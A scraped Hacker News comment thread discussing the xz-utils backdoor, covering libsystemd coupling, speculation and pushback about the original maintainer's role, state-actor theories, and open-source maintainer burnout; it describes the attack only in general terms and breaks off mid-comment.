| | | |  |  | [jnxx](user?id=jnxx) [9 months ago](item?id=39872920)   | [root](#39867106) | [parent](#39872878) | [next](#39872385) [–]  It is not just systemd which uses xz. For example, Debian's dpkg links xz-utils. | | --- | --- | --- | | | |  |  | [ahartmetz](user?id=ahartmetz) [9 months ago](item?id=39873370)   | [root](#39867106) | [parent](#39872920) | [next](#39872385) [–]  However, this particular attack only works through libsystemd to compromise sshd and it *is* related to systemd's kitchen sink "design". | | --- | --- | --- | | | |  |  | [JdeBP](user?id=JdeBP) [9 months ago](item?id=39874070)   | [root](#39867106) | [parent](#39873370) | [next](#39876210) [–]  It's related to excessive coupling between modules and low coherence. There *is* a way for programs to implement the systemd readiness notification protocol without using libsystemd, and thus without pulling in liblzma, which is coupled to libsystemd even though the readiness notification protocol does not require any form of compression. libsystemd provides a wide range of things which have only weak relationships to each other. There are in fact two ways, as two people independently wrote their own client code for the systemd readiness notification protocol, which really does not require the whole of libsystemd and its dependencies to achieve. (It might be more than 2 people nowadays.) \* [https://jdebp.uk/FGA/unix-daemon-readiness-protocol-problems...](https://jdebp.uk/FGA/unix-daemon-readiness-protocol-problems.html#CrippledAdoption) | | --- | --- | --- | | | |  |  | [EvmRoot](user?id=EvmRoot) [9 months ago](item?id=39876210)   | [root](#39867106) | [parent](#39873370) | [prev](#39874070) | [next](#39874321) [–]  This is only evidence that libsystemd is popular. If you want to 0wn a bunch of systems, or even one particular system but make it non-obvious, you choose a popular package to mess with. BeOS isn't getting a lot of CVEs attached to it, these days. That doesn't mean its good or secure, though. | | --- | --- | --- | | | |  |  | [varjag](user?id=varjag) [9 months ago](item?id=39878648)   | [root](#39867106) | [parent](#39876210) | [next](#39874321) [–]  All that could change if BeOS adopts systemd. | | --- | --- | --- | | | |  |  | [Matl](user?id=Matl) [9 months ago](item?id=39874321)   | [root](#39867106) | [parent](#39873370) | [prev](#39876210) | [next](#39872385) [–]  It's easy to have your existing biases validated if you already dislike systemd. The reality is that systemd is much more coherently designed than its predecessors from a 'end user interface' point of view, hence why its units are largely portable etc. which was not the case for sysvinit. The reality is that it is not systemd specifically but our modern approach to software design where we tend to rely on too much third party code and delight in designing extremely flexible, yet ultimately extremely complex pieces of software. I mean this is even true as far as the various CPU attack vectors have shown in recent years, that yes speculative execution is a neat and 'clever' optimization and that we rely on it for speed, but that maybe that was just too clever a path to go down and we should've stuck with simpler designs that would maybe led to slower speedups but a more solid foundation to build future CPU generations on. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39919552)   | [root](#39867106) | [parent](#39874321) | [next](#39882777) [–]  Let's be real, sshd loading random libraries it doesn't actually need because distros patched in a kitchen sink library is inexcusable. That kitchen sink library is libsystemd and it follows the same kitchen sink design principle that systemd-opponents have been criticising all along. But its easier to accuse them of being biased rather consider that maybe they have a point. | | --- | --- | --- | | | |  |  | [ds-tech\_media](user?id=ds-tech_media) [9 months ago](item?id=39882777)   | [root](#39867106) | [parent](#39874321) | [prev](#39919552) | [next](#39872385) [–]  People hate systemd from an ethical, philosophical, and ideological standpoint. People love systemd for the efficiency, economics, etc. It's like ideal vs production. | | --- | --- | --- | | | |  |  | [jnxx](user?id=jnxx) [9 months ago](item?id=39872385)   | [root](#39867106) | [parent](#39872145) | [prev](#39872878) | [next](#39874979) [52 more]  [flagged] | | --- | --- | --- | | | |  |  | [masklinn](user?id=masklinn) [9 months ago](item?id=39872573)   | [root](#39867106) | [parent](#39872385) | [next](#39872667) [–]  That is just technical disagreements and sour grapes by someone involved in a competing format (Lzip). There’s no evidence Lasse did anything “wrong” beyond looking for / accepting co-maintainers, something package authors are taken to task for *not* doing every time they have life catching up or get fed up and can’t / won’t spend as much time on the thing. | | --- | --- | --- | | | |  |  | [goodpoint](user?id=goodpoint) [9 months ago](item?id=39875073)   | [root](#39867106) | [parent](#39872573) | [next](#39872635) [–]  > That is just technical disagreements and sour grapes Care to provide some evidence to back this statement? | | --- | --- | --- | | | |  |  | [jnxx](user?id=jnxx) [9 months ago](item?id=39872635)   | [root](#39867106) | [parent](#39872573) | [prev](#39875073) | [next](#39872674) [35 more]  [flagged] | | --- | --- | --- | | | |  |  | [matsemann](user?id=matsemann) [9 months ago](item?id=39872726)   | [root](#39867106) | [parent](#39872635) | [next](#39872919) [–]  > *But is this appropiate here?* Yes, nothing points to the inventor of the format and maintainer for decades has done anything with the format to make it suspect. If so, the recent backdoor wouldn't be needed. It's good to be skeptic, but don't drag people through the mud without anything to back it up. | | --- | --- | --- | | | |  |  | [jnxx](user?id=jnxx) [9 months ago](item?id=39872948)   | [root](#39867106) | [parent](#39872726) | [next](#39872919) [–]  If a project targets a high-profile, very security sensitive project like the linux kernel from the start, as the archived tukaani web site linked above shows, it is justified to ask questions. Also, the exploit shows a high effort, and a high level of competence, and a very obvious willingness to play a long game. These are not circumstances for applying Hanlon's razor. | | --- | --- | --- | | | |  |  | [matsemann](user?id=matsemann) [9 months ago](item?id=39873133)   | [root](#39867106) | [parent](#39872948) | [next](#39872919) [–]  Are you raising the same concerns and targeting individuals behind all other sensitive projects? No, because that would be insane. It's weird to have one set of standards to a maintainer since 2009 or so, and different standards for others. This witch hunt is just post-hoc smartassery. | | --- | --- | --- | | | |  |  | [jnxx](user?id=jnxx) [9 months ago](item?id=39873860)   | [root](#39867106) | [parent](#39873133) | [next](#39872919) [–]  Yes, I think if a project has backdoors and its old maintainers are unable to review them, I am more critical than with normal projects. As said, compression is used everywhere and in embedded systems, it touches a lot of critical stuff. And the project went straight for that since the beginning. And this is in part because I can not even tell for sure that he even exists. If I had met him a few times in a bar, I would be more inclined to believe he is not involved. | | --- | --- | --- | | | |  |  | [UncleEntity](user?id=UncleEntity) [9 months ago](item?id=39874756)   | [root](#39867106) | [parent](#39873860) | [next](#39874265) [–]  I'm inclined to believe that whatever state actor was involved sent a memo to their sockpuppets to do whatever they can to deflect blame away. See what I did there? | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39874265)   | [root](#39867106) | [parent](#39873860) | [prev](#39874756) | [next](#39872919) [–]  > As said, compression is used everywhere and in embedded systems, it touches a lot of critical stuff. And the project went straight for that since the beginning. Uh, because it's a compression library? | | --- | --- | --- | | | |  |  | [ljahier](user?id=ljahier) [9 months ago](item?id=39877762)   | [root](#39867106) | [parent](#39874265) | [next](#39872919) [–]  From the project readme: > XZ Utils provide a general-purpose data-compression library plus 21 command-line tools. [https://git.tukaani.org/?p=xz.git;a=blob;f=README;h=ac812ff1...](https://git.tukaani.org/?p=xz.git;a=blob;f=README;h=ac812ff150ca12bece1c266c5f4efe8e860be752;hb=HEAD) | | --- | --- | --- | | | |  |  | [masklinn](user?id=masklinn) [9 months ago](item?id=39872919)   | [root](#39867106) | [parent](#39872635) | [prev](#39872726) | [next](#39872674) [–]  > You appeal to trust people and give them the benefit of doubt which is normally a good thing. But is this appropiate here? Yes. Without evidence to the contrary there is no reason to believe Lasse has been anything other than genuine so all you're doing is insulting and slandering them out of personal satisfaction. And conspiratorial witch hunts are actively counter-productive, through that mode of thinking it doesn't take much imagination to figure out *you* are part of the conspiracy for instance. | | --- | --- | --- | | | |  |  | [jnxx](user?id=jnxx) [9 months ago](item?id=39873336)   | [root](#39867106) | [parent](#39872919) | [next](#39873293) [–]  The thing is there are two possibilities: 1. An important project has an overburdened / burnt out maintainer, and that project is taken over by a persona who appears to help kindly, but is part of a campaign of a state actor. 2. A state actor is involved in setting up such a project from the start. The first possibility is not only being an asshole to the original maintainer, but it is also more risky - that original maintainer surely feels responsible for his creation and could ring alarm bells. This is not unlikely because he knows the code. And alarm bells is something that state actors do not like. The second possibility has the risk of the project not being successful, which would mean a serious investment in resources to fail. But that could be countered by having competent people working on that. And in that case, you don't have any real persons,just account names. What happened here? I don't know. | | --- | --- | --- | | | |  |  | [Delk](user?id=Delk) [9 months ago](item?id=39873552)   | [root](#39867106) | [parent](#39873336) | [next](#39874575) [–]  I don't think state actors would care one bit about being assholes. Organized crime black hats probably wouldn't either. The original maintainer has said in the past, before Jia Tan's increased involvement and stepping up as a maintainer, that he couldn't put as much into the project due to mental health and other reasons [1]. Seems to fit possibility number one rather well. If you suspect that Lasse Collin was somehow in it from the start, that'd mean the actor orchestrated the whole thing about mental health and not being able to keep up with sole maintainership. Why would they even do that if they had the project under their control already? Of course we don't know what's really been happening with the project recently, or who's behind the backdoor and how. But IMO creating suspicions about the original maintainer's motives based *entirely* on speculation is also a bit assholey. edit: [1] [https://www.mail-archive.com/xz-devel@tukaani.org/msg00567.h...](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00567.html) | | --- | --- | --- | | | |  |  | [jnxx](user?id=jnxx) [9 months ago](item?id=39873771)   | [root](#39867106) | [parent](#39873552) | [next](#39874575) [–]  > Why would they even do that More layers of obfuscation. For example in order to be able to attribute the backdoor to a different party. It is of course also possible that Lasse Collins is a nice real person who just has not been able to review this. Maybe he is too ill,or has to care for an ill spouse, or perhaps he is not even alive any more. Who knows him as a person (not just an account name) and knows how he is doing? | | --- | --- | --- | | | |  |  | [roenxi](user?id=roenxi) [9 months ago](item?id=39874220)   | [root](#39867106) | [parent](#39873771) | [next](#39874256) [–]  That is kinda crazy - state actors don't need to care about that level of obfuscation. From a state's perspective the situation here would be simple - hire a smart & patriotic programmer to spend ~1+ years maintaining an important package, then they slip a backdoor in. There isn't any point in making it more complicated than that. They don't even need plausible deniability, groups like the NSA have been caught spying on everyone and it doesn't hurt them all that much. The publicity isn't ideal. But it only confirms what we already new - turns out the spies are spying on people! Who knew. There are probably dozens if not hundreds of this sort of attempt going on right now. I'd assume most don't get caught. Or go undetected for a many years which is good enough enough. If you have government money on the budget, it makes sense to go with large-volume low-effort attempts rather than try some sort of complex good-cop-bad-cop routine. | | --- | --- | --- | | | |  |  | [ds-tech\_media](user?id=ds-tech_media) [9 months ago](item?id=39882744)   | [root](#39867106) | [parent](#39874220) | [next](#39874256) [–]  You're correct about a great many things. State actors do things in broad-daylight, get exposed, and it's no fuss to them at all. But that depends on which "sphere of influence" you live in. Russia and China have made major changes to key parts of their critical infrastructure based on revelations that might only result in a sub-committee in US Congress. But to establish a significant contributor to a key piece of software, not unlike xz, is an ideal position for a state actor. The developer doesn't even need to know who/why, but they could be financially/ideologically aligned. This is what intelligence officers do. They manage real human assets who exist naturally. But to have someone long-established as an author of a project is the exact type of asset they want. Even if they push the code, people immediately start considering how it could have been done by someone else. Yes, it's conspiratorial/paranoid thinking but there's nothing more paranoid than state intelligence trade craft. | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39874256)   | [root](#39867106) | [parent](#39873771) | [prev](#39874220) | [next](#39874503) [–]  You can imagine all the layers of obfuscation you want, but it doesn't seem necessary to explain what is going on here. | | --- | --- | --- | | | |  |  | [johnisgood](user?id=johnisgood) [9 months ago](item?id=39874503)   | [root](#39867106) | [parent](#39873771) | [prev](#39874256) | [next](#39874575) [–]  On [https://www.mail-archive.com/xz-devel@tukaani.org/msg00567.h...](https://www.mail-archive.com/xz-devel%40tukaani.org/msg00567.html), Lasse Collin mentions long-term mental health issues among other things. | | --- | --- | --- | | | |  |  | [doug\_durham](user?id=doug_durham) [9 months ago](item?id=39876571)   | [root](#39867106) | [parent](#39874503) | [next](#39875243) [–]  It makes me wonder. Is it possible to develop a robust Open Source ecosystem without destroying the mental health of the contributors? Reading his posting really made me feel for him. There are exceedingly few people who are willing do dedicate themselves to developing critical system in the first place. Now there is the burden of extensively vetting every volunteer contributor who helps out. This does not seem sustainable. Perhaps users of open source need to contribute more resources/money to the software that makes their products possible. | | --- | --- | --- | | | |  |  | [beanjuiceII](user?id=beanjuiceII) [9 months ago](item?id=39875243)   | [root](#39867106) | [parent](#39874503) | [prev](#39876571) | [next](#39874575) [–]  would be nice if he'd come out with some statements considering he's still committing to xz as of few hours ago [https://git.tukaani.org/?p=xz.git;a=commit;h=f9cf4c05edd14de...](https://git.tukaani.org/?p=xz.git;a=commit;h=f9cf4c05edd14dedfe63833f8ccbe41b55823b00) | | --- | --- | --- | | | |  |  | [LigmaBaulls](user?id=LigmaBaulls) [9 months ago](item?id=39875412)   | [root](#39867106) | [parent](#39875243) | [next](#39874575) [–]  You mean a statement like this <https://tukaani.org/xz-backdoor/> | | --- | --- | --- | | | |  |  | [themoonisachees](user?id=themoonisachees) [9 months ago](item?id=39874575)   | [root](#39867106) | [parent](#39873336) | [prev](#39873552) | [next](#39873293) [–]  False dichotomy much? It doesn't have to be a motivated state actor pulling the strings from the begging. It could also just be some guy, who decided he didn't care anymore and either wanted to burn something or got paid by someone (possibly a state actor) to do this. | | --- | --- | --- | | | |  |  | [vbi8iBEX](user?id=vbi8iBEX) [9 months ago](item?id=39873293)   | [root](#39867106) | [parent](#39872919) | [prev](#39873336) | [next](#39872674) [16 more]  [flagged] | | --- | --- | --- | | | |  |  | [vbi8iBEX](user?id=vbi8iBEX) [9 months ago](item?id=39874877)   | [root](#39867106) | [parent](#39873293) | [next](#39872674) [16 more]  [flagged] | | --- | --- | --- | | | |  |  | [vbi8iBEX](user?id=vbi8iBEX) [9 months ago](item?id=39875050)   | [root](#39867106) | [parent](#39874877) | [next](#39872674) [16 more]  [flagged] | | --- | --- | --- | | | |  |  | [rmast](user?id=rmast) [9 months ago](item?id=39876391)   | [root](#39867106) | [parent](#39875050) | [next](#39872674) [–]  Recall that the original maintainer had mental health issues and other things that likely led to the perceived need to bring on someone to help maintain xz. This brings up some integrity questions about you and other people bringing forth accusations in order to make the original maintainer feel pressure to bring on someone else to replace the one that inserted a backdoor after several years of ostensibly legitimate commits. Hopefully this helps you see that these sorts of accusations are a slippery slope and unproductive. Heck, you could then turnaround and accuse me of doing something nefarious by accusing you. | | --- | --- | --- | | | |  |  | [vbi8iBEX](user?id=vbi8iBEX) [9 months ago](item?id=39876453)   | [root](#39867106) | [parent](#39876391) | [next](#39876400) [–]  Actually my solution as outlined on twitter was to enforce non anon commits, and i stated it is a bad idea to replace him, so try again. And, as stated above, I don't think he's malicious, it's still something that must be considered. Sweeping the possibility away is weird. | | --- | --- | --- | | | |  |  | [rmast](user?id=rmast) [9 months ago](item?id=39876633)   | [root](#39867106) | [parent](#39876453) | [next](#39876400) [–]  I don’t stalk all of your social media posts, so from my perspective I don’t see any of the solutions you’ve posted elsewhere — which brings up a good point to keep in mind: none of us see the complete picture (or can read minds to know what someone else really thinks). The possibility can be kept in mind and considered even if it isn’t being actively discussed. I think in this case, most people think he is not malicious — and feel that unless new compelling evidence to show otherwise appears, potentially starting a harmful rumor based on speculation is counterproductive. | | --- | --- | --- | | | |  |  | [vbi8iBEX](user?id=vbi8iBEX) [9 months ago](item?id=39876701)   | [root](#39867106) | [parent](#39876633) | [next](#39876400) [–]  I'm not starting a harmful rumor. People are asking legitimate questions in order to paint the whole picture. Being gaslit is very weird. > I don't stalk your socials I mentioned it because you called my intent into question. Why are people running cover for the maintainer of a repo that just tried to backdoor sshd when others are asking legitimate questions? | | --- | --- | --- | | | |  |  | [rmast](user?id=rmast) [9 months ago](item?id=39877158)   | [root](#39867106) | [parent](#39876701) | [next](#39876400) [–]  You might not be trying to start a rumor, but other people could when they try to answer the questions from a place of ignorance — if you take a look at the comments on a gist summarizing the backdoor, there are quite a few comments by z-nonymous that seem to be insinuating that other specific GitHub users are complicit in things by looking at their commits in various non-xz repositories. No one is running cover, just that most information so far points to the original maintainer not knowing that the person brought on to help out had ulterior motives, and likely wasn’t even who they purported to be. If you were running an open source project and facing burnout as the sole maintainer, I’d imagine you’d exercise perfect judgement and do a full background check on the person offering to help? I think many of us would like to believe we’d do better, but the reality is, most of us would have fallen for the same trick. So now imagine having to deal with the fallout not just on the technical side, but also the never-ending questions surrounding your professional reputation that people just keep bring up — sounds like a recipe for depression, possibly even suicidal thoughts. | | --- | --- | --- | | | |  |  | [vbi8iBEX](user?id=vbi8iBEX) [9 months ago](item?id=39877696)   | [root](#39867106) | [parent](#39877158) | [next](#39876400) [–]  I am running an open source project. Yes if someone was eager to help and was making changes to things that involved security, I would make them doxx themselves and submit to a background check | | --- | --- | --- | | | |  |  | [rmast](user?id=rmast) [9 months ago](item?id=39877862)   | [root](#39867106) | [parent](#39877696) | [next](#39876400) [–]  Well, good for you being one of the few exceptions who would make everyone submit themselves to a proper background check (presumably also covering the cost) before giving any write/commit access to the repo. That’s more than even most large open source projects do before giving access. | | --- | --- | --- | | | |  |  | [vbi8iBEX](user?id=vbi8iBEX) [9 months ago](item?id=39878585)   | [root](#39867106) | [parent](#39877862) | [next](#39876400) [–]  Thanks, but you assume too much. I outlined the circumstances under which i would require a background check, so you might want to reread. any other questions? | | --- | --- | --- | | | |  |  | [rmast](user?id=rmast) [9 months ago](item?id=39879664)   | [root](#39867106) | [parent](#39878585) | [next](#39876400) [–]  As I understand it Jia was contributing things like tests, not making changes that involve “security”. They just turned the commit, and eventual ability to make releases on the xz GitHub after “earning” more trust (+ access to GitHub pages hosted under tukaani domain), into something they could use to insert a backdoor. No questions. Anyone can become a victim to social engineering — I believe the short answer to your question about all the downvotes is that a lot of people recognize how they could have fallen for something similar, and empathize that Lasse is likely now going through a rather difficult time. | | --- | --- | --- | | | |  |  | [vbi8iBEX](user?id=vbi8iBEX) [9 months ago](item?id=39881584)   | [root](#39867106) | [parent](#39879664) | [next](#39876400) [–]  I have no question about the downvotes, bud. You're very verbose. Still not sure why you revived an account you haven't commented with in 6 years just to run cover. I find you to be a highly suspicious individual and I really have nothing more to say to you. | | --- | --- | --- | | | |  |  | [rmast](user?id=rmast) [9 months ago](item?id=39881949)   | [root](#39867106) | [parent](#39881584) | [next](#39876400) [–]  I suppose I think verbose-ness will help people see the other side of things. I think I was also trying to convince myself that you aren’t just into conspiracy theories, but given that you’re now accusing me of being suspicious… :shrug: it did come full circle where in my first comment I said you would start accusing me. I guess neither of us have anything more to say to each other because we are both too locked into our own beliefs. As for motivation… <https://xkcd.com/386/> enough said :)   [2 more](item?id=39881949) | | --- | --- | --- | | | |  |  | [thinkingemote](user?id=thinkingemote) [9 months ago](item?id=39876400)   | [root](#39867106) | [parent](#39876391) | [prev](#39876453) | [next](#39872674) [–]  It's possible that he was intentionally pressured and his mental health made bad or worse by the adversary to increase stress. The adversary would then propose to help them reduce the stress. It's probably straight out of many playbooks. | | --- | --- | --- | | | |  |  | [vbi8iBEX](user?id=vbi8iBEX) [9 months ago](item?id=39876492)   | [root](#39867106) | [parent](#39876400) | [next](#39872674) [–]  Additionally to the guy's above point, replacing him after this incident would complete that play | | --- | --- | --- | | | |  |  | [voidz](user?id=voidz) [9 months ago](item?id=39872674)   | [root](#39867106) | [parent](#39872573) | [prev](#39872635) | [next](#39872667) [–]  It argues the topic pretty well: xz is unsuitable for long-term archival. The arguments are in-depth and well worded. Do you have any argument to the contrary beyond "sour grapes"? | | --- | --- | --- | | | |  |  | [matsemann](user?id=matsemann) [9 months ago](item?id=39872705)   | [root](#39867106) | [parent](#39872674) | [next](#39919442) [–]  It's not relevant to the current issue at hand. | | --- | --- | --- | | | |  |  | [evrial](user?id=evrial) [9 months ago](item?id=39874510)   | [root](#39867106) | [parent](#39872705) | [next](#39919442) [–]  If you say "sour grapes", then back down your bold statement or don't say at all. | | --- | --- | --- | | | |  |  | [masklinn](user?id=masklinn) [9 months ago](item?id=39874568)   | [root](#39867106) | [parent](#39874510) | [next](#39919442) [–]  What are you talking about? Do you understand multiple people use this site? Also do you mean back up? Antonio literally used to go around mailing lists asking for lzip support and complaining about xz: - <https://gcc.gnu.org/legacy-ml/gcc/2017-06/msg00044.html> - <https://lists.debian.org/debian-devel/2017/06/msg00433.html> Also, [https://web.archive.org/web/20190605225651/http://octave.159...](https://web.archive.org/web/20190605225651/http%3A//octave.1599824.n4.nabble.com/opinion-bring-back-Octave-xz-source-release-td4683705.html) I can understand wanting your project to succeed, it's pretty natural and human, but it's flagrant Antonio had a lot of feels about the uptake of xz compared to lzip, as both are container formats around raw lzma data streams and lzip predates xz by 6 months. His complaint article about xz is literally one of the "Introductory links" of lzip. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39919442)   | [root](#39867106) | [parent](#39872674) | [prev](#39872705) | [next](#39872667) [–]  > xz is unsuitable for long-term archival Neither is lzip since it doesn't contain error correction codes. You can add those with an additional file (to any archive) e.g. via par2 but then most of the points in the linked rant become irrelevant. | | --- | --- | --- | | | |  |  | [shzhdbi09gv8ioi](user?id=shzhdbi09gv8ioi) [9 months ago](item?id=39872667)   | [root](#39867106) | [parent](#39872385) | [prev](#39872573) | [next](#39874979) [–]  This link is opinion piece about the file format and has nothing to do with today's news. Also, Lasse has not been accused of any wrong-doings. | | --- | --- | --- | | | |  |  | [varjag](user?id=varjag) [9 months ago](item?id=39872893)   | [root](#39867106) | [parent](#39872667) | [next](#39874523) [–]  His GH account was suspended, in what I believe a very unfortunate case of collateral damage. | | --- | --- | --- | | | |  |  | [semi-extrinsic](user?id=semi-extrinsic) [9 months ago](item?id=39878059)   | [root](#39867106) | [parent](#39872893) | [next](#39874523) [–]  Collateral damage yes, but it seems like he is currently away from the internet for an extended time. So it could be that Github needed to suspend his account in order to bypass things that he would otherwise have to do/approve? Or to preempt the possibility that his account was also compromised and we don't know yet. | | --- | --- | --- | | | |  |  | [evrial](user?id=evrial) [9 months ago](item?id=39874523)   | [root](#39867106) | [parent](#39872667) | [prev](#39872893) | [next](#39872755) [–]  Except it unnecessary complexity is very convenient to limit the code audit to only domain experts. | | --- | --- | --- | | | |  |  | [jnxx](user?id=jnxx) [9 months ago](item?id=39872755)   | [root](#39867106) | [parent](#39872667) | [prev](#39874523) | [next](#39874956) [5 more]  [flagged] | | --- | --- | --- | | | |  |  | [shzhdbi09gv8ioi](user?id=shzhdbi09gv8ioi) [9 months ago](item?id=39872770)   | [root](#39867106) | [parent](#39872755) | [next](#39874956) [–]  No. I mean that the link you shared is a opinion piece about the xz file format, and those opinions are fully unrelated to today's news and only serve to further discredit Lasse Collin who for all we know have been duped and tricked by a nation state, banned by github and is having a generally shitty time. Why are you trying to discredit Lasse? | | --- | --- | --- | | | |  |  | [jnxx](user?id=jnxx) [9 months ago](item?id=39873870)   | [root](#39867106) | [parent](#39872770) | [next](#39874956) [–]  That critique adresses security aspects. | | --- | --- | --- | | | |  |  | [Matl](user?id=Matl) [9 months ago](item?id=39874450)   | [root](#39867106) | [parent](#39873870) | [next](#39873948) [–]  There may be some suboptimal things about security of the XZ file format, I don't know. I bet you there are less than optimal security choices in your most cherished piece of software as well. This thread is about an exploit that does not rely on any potential security problems in the DESIGN of the xz FORMAT. Therefore your point, even if valid as a general one, is not really relevant to the exploit we're discussing. Further, there's some proof needed that any potential suboptimal aspects of the security design of the xz FORMAT was designed such so that it could be exploited later or simply because no programmer is an expert on every aspect of security ever. I mean you could be the most security conscious programmer and your chain could still be compromised. Security today is such a vast field and it takes so little to get you compromised that proclaiming anything 'secure design' these days is practically impossible. I bet you an audit of lzip would find plenty of security issues, would those be intentional? | | --- | --- | --- | | | |  |  | [shzhdbi09gv8ioi](user?id=shzhdbi09gv8ioi) [9 months ago](item?id=39873948)   | [root](#39867106) | [parent](#39873870) | [prev](#39874450) | [next](#39874956) [–]  You seem to be rather determined in continuing to badmouth Lasse, ignoring me and others questioning your motives. Here are recent examples: 1. <https://news.ycombinator.com/item?id=39872919> 2. <https://news.ycombinator.com/item?id=39873552> 3. <https://news.ycombinator.com/item?id=39873133> 4. <https://news.ycombinator.com/item?id=39872770> | | --- | --- | --- | | | |  |  | [jart](user?id=jart) [9 months ago](item?id=39874956)   | [root](#39867106) | [parent](#39872667) | [prev](#39872755) | [next](#39874979) [–]  People don't always reveal the true reason they want to destroy something. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39919476)   | [root](#39867106) | [parent](#39874956) | [next](#39874979) [–]  Like the lzip author when he wrote that hitpiece? | | --- | --- | --- | | | |  |  | [pmarreck](user?id=pmarreck) [9 months ago](item?id=39874979)   | [root](#39867106) | [parent](#39869863) | [prev](#39872145) | [next](#39870618) [–]  I have some questions. 1) Are there no legit code reviews from contributors like this? How did this get accepted into main repos while flying under the radar? When I do a code review, I try to understand the actual code I'm reviewing. Call me crazy I guess! 2) Is there no legal recourse to this? We're talking about someone who managed to root any linux server that stays up-to-date. | | --- | --- | --- | | | |  |  | [WhyNotHugo](user?id=WhyNotHugo) [9 months ago](item?id=39875288)   | [root](#39867106) | [parent](#39874979) | [next](#39876458) [–]  > 2) Is there no legal recourse to this? We're talking about someone who managed to root any linux server that stays up-to-date. Any government which uses GNU/Linux in their infrastructure can pitch this as an attempt to backdoor their servers. The real question is: will we ever even know who was behind this? If it was some mercenary hacker intending to resell the backdoor, maybe. But if it was someone working with an intelligence agency in US/China/Israel/Russia/etc, I doubt they'll ever be exposed. | | --- | --- | --- | | | |  |  | [darkelder](user?id=darkelder) [9 months ago](item?id=39880596)   | [root](#39867106) | [parent](#39875288) | [next](#39876458) [–]  Reflecting on the idea of introducing a validation structure for software contributions, akin to what RPKI does for BGP routing, I see significant potential to enhance security and accountability in software development. Such a system could theoretically bring greater transparency and responsibility, particularly in an ecosystem where contributions come from all corners. Implementing verifiable identity proofs for contributors might be challenging, but it also presents an opportunity to bolster security without compromising privacy and the freedom to contribute under pseudonyms. The accountability of those accepting pull requests would also become clearer, potentially reducing the risk of malicious code being incorporated. Of course, establishing a robust validation chain for software would require the commitment of everyone in the development ecosystem, including platforms like GitHub. However, I view this not as a barrier but as an essential step towards evolving our approach to security and collaboration in software development. | | --- | --- | --- | | | |  |  | [treffer](user?id=treffer) [9 months ago](item?id=39876458)   | [root](#39867106) | [parent](#39874979) | [prev](#39875288) | [next](#39893513) [–]  The actual inclusion code was never in the repo. The blobs were hidden as lzma test files. So you review would need to guess from 2 new test files that those are, decompressed, a backdoor and could be injected which was never in the git history. This was explicitly build to evade such reviews. | | --- | --- | --- | | | |  |  | [pmarreck](user?id=pmarreck) [9 months ago](item?id=39880858)   | [root](#39867106) | [parent](#39876458) | [next](#39877132) [–]  > The blobs were hidden as lzma test files. OK, that is absolutely devious. | | --- | --- | --- | | | |  |  | [xghryro](user?id=xghryro) [9 months ago](item?id=39877132)   | [root](#39867106) | [parent](#39876458) | [prev](#39880858) | [next](#39893513) [–]  I suppose you think the maintainers shouldn’t have scrutinized those files? Please tell me it’s a joke. | | --- | --- | --- | | | |  |  | [ab5tract](user?id=ab5tract) [9 months ago](item?id=39879699)   | [root](#39867106) | [parent](#39877132) | [next](#39927627) [–]  The person who added the malicious blobs and signed the compromized archives was *literally* a maintainer of the project. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39927627)   | [root](#39867106) | [parent](#39877132) | [prev](#39879699) | [next](#39893513) [–]  Ok, go ahead and scrutinize those files without looking at the injection code that was never in the repo? Can you find anything malicious? Probably not - it looks like random garbage which is what it was claimed to be. | | --- | --- | --- | | | |  |  | [xign](user?id=xign) [9 months ago](item?id=39893513)   | [root](#39867106) | [parent](#39874979) | [prev](#39876458) | [next](#39877005) [–]  "Jia Tan" was not a contributor, but a *maintainer* of the project. The key point here is that this is a multi-year project of infiltrating the xz project and gaining commit access. In a large tech company (including ones I have worked at), sometimes you have policy where every change has to be code reviewed by another person. This kind of stuff isn't possible when the whole project only has 1-2 maintainers. Who's going to review your change other than yourself? This is the whole problem of OSS right now that a lot of people are bringing up. I maintain a widely used open source project myself. I would *love* it if I could get high quality code review for my commits similar to my last workplace lol, but very very few people are willing to roll up their sleeves like that and work for free. Most people would just go to the Releases page and download your software instead. | | --- | --- | --- | | | |  |  | [andrepd](user?id=andrepd) [9 months ago](item?id=39877005)   | [root](#39867106) | [parent](#39874979) | [prev](#39893513) | [next](#39870618) [–]  >How did this get accepted into main repos while flying under the radar? When I do a code review, I try to understand the actual code I'm reviewing. Call me crazy I guess! And? You never do any mistakes? Google "underhanded C contest" | | --- | --- | --- | | | |  |  | [waynesonfire](user?id=waynesonfire) [9 months ago](item?id=39870618)   | [root](#39867106) | [parent](#39869863) | [prev](#39874979) | [next](#39870923) [–]  750 commits... is xz able to send e-mails yet? | | --- | --- | --- | | | |  |  | [wyldfire](user?id=wyldfire) [9 months ago](item?id=39870773)   | [root](#39867106) | [parent](#39870618) | [next](#39873438) [–]  No. But if you have any centrifuges they will probably exhibit inconsistent behavior. | | --- | --- | --- | | | |  |  | [shermantanktop](user?id=shermantanktop) [9 months ago](item?id=39871683)   | [root](#39867106) | [parent](#39870773) | [next](#39873438) [–]  Maybe it’s the centrifuges which will send the mail, making the world’s first uranium-enriching spam botnet. | | --- | --- | --- | | | |  |  | [soraminazuki](user?id=soraminazuki) [9 months ago](item?id=39873438)   | [root](#39867106) | [parent](#39870618) | [prev](#39870773) | [next](#39927673) [–]  It's hardly surprising given that parsing is generally considered to be a tricky problem. Plus, it's a 15 years old project that's widely used. 750 commits is nothing to sneer about. No wonder the original maintainer got burned out. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39927673)   | [root](#39867106) | [parent](#39870618) | [prev](#39873438) | [next](#39872796) [–]  750 is not that many commits if you follow a commit style where each independent change gets its own commit. | | --- | --- | --- | | | |  |  | [lovasoa](user?id=lovasoa) [9 months ago](item?id=39872796)   | [root](#39867106) | [parent](#39870618) | [prev](#39927673) | [next](#39870923) [–]  Yes, it sends an email containing your private key on installation. | | --- | --- | --- | | | |  |  | [indigodaddy](user?id=indigodaddy) [9 months ago](item?id=39870923)   | [root](#39867106) | [parent](#39869863) | [prev](#39870618) | [next](#39867911) [–]  Anyone have any level of confidence that for example EL7/8 would not be at risk even if more potential exploits at play? | | --- | --- | --- | | | |  |  | [Gelob](user?id=Gelob) [9 months 